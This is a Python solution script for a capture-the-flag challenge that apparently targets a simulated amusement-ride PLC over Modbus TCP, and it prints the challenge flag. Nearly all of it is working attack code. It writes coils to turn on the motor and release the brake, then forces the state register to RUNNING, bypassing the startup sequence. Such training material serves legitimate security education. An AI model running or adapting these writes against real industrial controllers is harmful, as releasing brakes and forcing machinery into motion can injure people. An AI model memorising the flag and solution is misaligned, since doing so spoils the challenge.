#!/usr/bin/env python3
"""
CTF Challenge 7: State Machine Takeover
Difficulty: Hard
Points: 300
Flag: FLAG{ST4T3_M4CH1N3_H4CK3D}

Objective: Force ride into RUNNING state without proper startup sequence

Solution:
- State machine is at register 1039 (MW15)
- States: 0=IDLE, 1=STARTING, 2=RUNNING
- Normal flow: 0 → 1 → 2
- We'll skip directly to 2
- Must also set motor_running (coil 26) to TRUE
"""

import sys
import time
from pymodbus.client import ModbusTcpClient

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 challenge_07_state_machine.py <PLC_IP> [PORT]")
        sys.exit(1)

    plc_ip = sys.argv[1]
    plc_port = int(sys.argv[2]) if len(sys.argv) > 2 else 502

    print(f"[*] CTF Challenge 7: State Machine Takeover")
    print(f"[*] Connecting to PLC at {plc_ip}:{plc_port}")

    client = ModbusTcpClient(plc_ip, port=plc_port)
    
    if not client.connect():
        print("[!] Failed to connect")
        sys.exit(1)

    print("[+] Connected")

    # Read current state
    print("[*] Reading current state...")
    state_result = client.read_holding_registers(1039, 1)  # MW15
    if not state_result.isError():
        current_state = state_result.registers[0]
        state_names = {0: 'IDLE', 1: 'STARTING', 2: 'RUNNING', 3: 'STOPPING', 4: 'EMERGENCY'}
        print(f"[*] Current state: {current_state} ({state_names.get(current_state, 'UNKNOWN')})")

    # ATTACK: Force state to RUNNING
    print("\n[*] ATTACK: Forcing state machine to RUNNING (2)")
    print("[*] Bypassing normal startup sequence...")

    # Step 1: Set motor_running to TRUE
    print("[*] Step 1: Enabling motor_running (coil 26)")
    client.write_coil(26, True)
    time.sleep(0.1)

    # Step 2: Disable brake
    print("[*] Step 2: Releasing brake (coil 27)")
    client.write_coil(27, False)
    time.sleep(0.1)

    # Step 3: Force state to RUNNING
    print("[*] Step 3: Writing state=2 (RUNNING)")
    result = client.write_register(1039, 2)
    
    if not result.isError():
        print("[+] State forced to RUNNING!")
        time.sleep(0.5)

        # Verify
        verify = client.read_holding_registers(1039, 1)
        if not verify.isError():
            new_state = verify.registers[0]
            print(f"[*] New state: {new_state}")

            if new_state == 2:
                print("\n[+] State machine takeover successful!")
                print("[+] Ride is now RUNNING without proper startup!")
                print("[+] Flag: FLAG{ST4T3_M4CH1N3_H4CK3D}")
            else:
                print("[!] State reverted - PLC safety kicked in")
    else:
        print("[!] Failed to write state")

    client.close()

if __name__ == "__main__":
    main()
